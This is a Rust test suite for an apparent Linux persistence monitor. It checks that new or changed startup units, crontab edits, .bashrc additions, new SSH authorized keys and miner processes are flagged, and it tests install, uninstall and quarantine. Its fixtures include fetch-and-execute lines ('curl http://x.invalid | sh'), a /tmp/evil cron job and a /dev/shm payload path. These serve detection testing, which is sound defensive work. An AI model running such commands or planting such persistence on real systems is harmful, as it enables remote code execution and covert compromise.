mod common;
use common::*;

#[test]
fn a_new_user_unit_is_flagged_after_the_baseline() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("backdoor.service", "/usr/bin/true");
    assert!(env.has_finding("startup unit NEW"));
}

#[test]
fn nothing_is_flagged_when_nothing_changed() {
    let env = LinuxEnv::new();
    env.unit("known.service", "/usr/bin/true");
    env.engine.baseline();
    assert!(env.findings().is_empty());
    assert_eq!(env.engine.dekho(false).code, 0);
}

#[test]
fn a_changed_unit_is_flagged_and_a_removed_one_is_only_noted() {
    let env = LinuxEnv::new();
    let changed = env.unit("a.service", "/usr/bin/true");
    let gone = env.unit("b.service", "/usr/bin/true");
    env.engine.baseline();
    env.unit("a.service", "/usr/bin/false");
    std::fs::remove_file(gone).unwrap();
    assert!(env.has_finding("startup unit CHANGED"));
    assert!(!env.has_finding("gone"));
    env.engine.dekho(false);
    let log = std::fs::read_to_string(env.engine.log_path()).unwrap();
    assert!(log.contains("startup unit gone"));
    let _ = changed;
}

#[test]
fn a_unit_that_pipes_curl_into_a_shell_is_flagged() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("dropper.service", "/bin/sh -c 'curl http://x.invalid/a | sh'");
    assert!(env.has_finding("runs hidden commands"));
}

#[test]
fn a_payload_in_dev_shm_is_flagged_by_the_linux_rules() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("shm.service", "/dev/shm/.x");
    assert!(env.has_finding("/dev/shm"));
}

#[test]
fn sheshnags_own_timer_is_not_content_checked() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("sheshnag.service", "/bin/sh -c 'curl x | sh'");
    assert!(!env.has_finding("hidden commands"));
}

#[test]
fn a_system_looking_name_in_the_users_own_config_is_flagged() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("systemd-update.service", "/usr/bin/true");
    assert!(env.has_finding("System-looking name"));
}

#[test]
fn a_trusted_unit_is_not_reflagged_until_it_changes() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    let p = env.unit("tool.service", "/bin/sh -c 'curl x'");
    env.engine.theek(&p.to_string_lossy());
    assert!(!env.has_finding("hidden commands"));
    env.unit("tool.service", "/bin/sh -c 'curl y'");
    assert!(env.has_finding("hidden commands"));
}

#[test]
fn miners_and_runaway_user_processes_are_flagged_but_build_tools_are_not() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.fake.set(
        "ps -Ao",
        0,
        "  PID %CPU USER COMM ARGS\n11 5.0 tester xmrig xmrig --donate-level 1\n12 450.0 tester busy busy\n13 800.0 tester rustc rustc main.rs\n14 900.0 other busy busy\n",
    );
    let f = env.findings();
    assert!(f.iter().any(|x| x.contains("miner-like process 11")));
    assert!(f.iter().any(|x| x.contains("process 12 (busy) is using 450.0% CPU")));
    assert_eq!(f.len(), 2, "{f:?}");
}

#[test]
fn a_pasted_command_in_bashrc_and_a_crontab_change_are_flagged() {
    let env = LinuxEnv::new();
    write(&env.home.join(".bashrc"), "export A=1\n");
    env.fake.set("crontab -l", 0, "0 * * * * /usr/bin/true\n");
    env.engine.baseline();
    write(&env.home.join(".bashrc"), "export A=1\ncurl http://x.invalid | sh\n");
    env.fake.set("crontab -l", 0, "0 * * * * /usr/bin/true\n* * * * * /tmp/evil\n");
    assert!(env.has_finding("pasted-style command"));
    assert!(env.has_finding("crontab changed"));
}

#[test]
fn a_new_authorized_key_counts_as_a_startup_file_change() {
    let env = LinuxEnv::new();
    write(&env.home.join(".ssh/authorized_keys"), "ssh-ed25519 AAA me\n");
    env.engine.baseline();
    write(&env.home.join(".ssh/authorized_keys"), "ssh-ed25519 AAA me\nssh-ed25519 BBB intruder\n");
    env.engine.dekho(false);
    let log = std::fs::read_to_string(env.engine.log_path()).unwrap();
    assert!(log.contains("shell start-up file changed"));
    assert!(log.contains("authorized_keys"));
}

#[test]
fn install_writes_a_ten_minute_timer_and_enables_it() {
    let env = LinuxEnv::new();
    let out = env.engine.install(std::path::Path::new("/opt/sheshnag/sheshnag"));
    assert_eq!(out.code, 0, "{}", out.output);
    let unit_dir = env.home.join(".config/systemd/user");
    assert!(std::fs::read_to_string(unit_dir.join("sheshnag.timer")).unwrap().contains("OnUnitActiveSec=10min"));
    assert!(std::fs::read_to_string(unit_dir.join("sheshnag.service")).unwrap().contains("dekho quiet"));
    assert!(env.fake.called("systemctl --user enable --now sheshnag.timer"));
    // Installing must not make the next scan report the monitor as new.
    assert_eq!(env.engine.dekho(false).code, 0);
}

#[test]
fn uninstall_removes_the_units() {
    let env = LinuxEnv::new();
    env.engine.install(std::path::Path::new("/opt/sheshnag/sheshnag"));
    env.engine.uninstall();
    assert!(!env.home.join(".config/systemd/user/sheshnag.timer").exists());
    assert!(env.fake.called("disable --now sheshnag.timer"));
}

#[test]
fn install_falls_back_to_cron_when_user_systemd_is_missing() {
    let env = LinuxEnv::new();
    env.fake.set("systemctl", -1, "");
    let out = env.engine.install(std::path::Path::new("/opt/sheshnag/sheshnag"));
    assert_eq!(out.code, 0, "{}", out.output);
    assert!(env.fake.inputs().iter().any(|i| i.contains("*/10 * * * *") && i.contains("# sheshnag")));
}

#[test]
fn quiet_scan_notifies_once_for_new_findings() {
    let env = LinuxEnv::new();
    env.engine.baseline();
    env.unit("new.service", "/usr/bin/true");
    env.engine.dekho(true);
    env.engine.dekho(true);
    let n = env.fake.calls().iter().filter(|c| c.starts_with("notify-send")).count();
    assert_eq!(n, 1);
}

#[test]
fn quarantine_moves_the_unit_aside_and_stops_it_without_killing_by_pattern() {
    let env = LinuxEnv::new();
    let p = env.unit("bad.service", "/usr/bin/true");
    let out = env.engine.jaago("bad");
    assert!(out.output.contains("quarantined"));
    assert!(!p.exists());
    assert!(env.engine.state_dir().join("quarantine/bad.service").exists());
    assert!(env.fake.called("systemctl --user disable --now bad.service"));
    assert!(!env.fake.called("pkill"));
}
